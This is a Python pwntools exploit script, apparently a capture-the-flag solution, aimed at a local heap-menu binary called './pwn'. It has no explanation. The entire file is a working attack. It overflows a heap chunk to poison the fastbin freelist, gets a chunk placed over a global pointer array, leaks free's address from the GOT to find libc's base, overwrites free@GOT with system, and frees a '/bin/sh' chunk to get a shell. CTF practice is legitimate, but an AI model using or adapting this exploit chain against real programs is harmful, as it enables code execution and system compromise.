from pwn import *
p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p,'''
#	break *0x0000000000400E58
#	continue
#''')
def add(size,x):
	p.recvuntil('Your choice:')
	p.sendline('2')
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the name of servant:')
	p.sendline(x)

def dele(idx):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(idx))

def edit(idx,size,x):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(idx))
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the new name of the servnat:')
	p.sendline(x)

def show():
	p.recvuntil('Your choice:')
	p.sendline('1')

add(0x68,'a'*0x68)
add(0x68,'b'*0x68)
add(0x68,'c'*0x68)
add(0x60,'/bin/sh\x00')
dele(1)
#edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
add(0x68,'a'*0x68)
add(0x68,'\x00'*3+p64(0x68)+p64(elf.got['free']))
show()
p.recvuntil('0 : ')
free_address=u64(p.recv(6).ljust(8,'\x00'))
#print hex(free_address)
log.info('free_address > '+hex(free_address))
libc_base=free_address-libc.symbols['free']
system_address=libc_base+libc.symbols['system']
log.info('system_address > '+hex(system_address))
#edit(2,0x8,'/bin/sh\x00')
edit(0,0x7,p64(system_address)[0:7])
dele(3)
p.interactive()

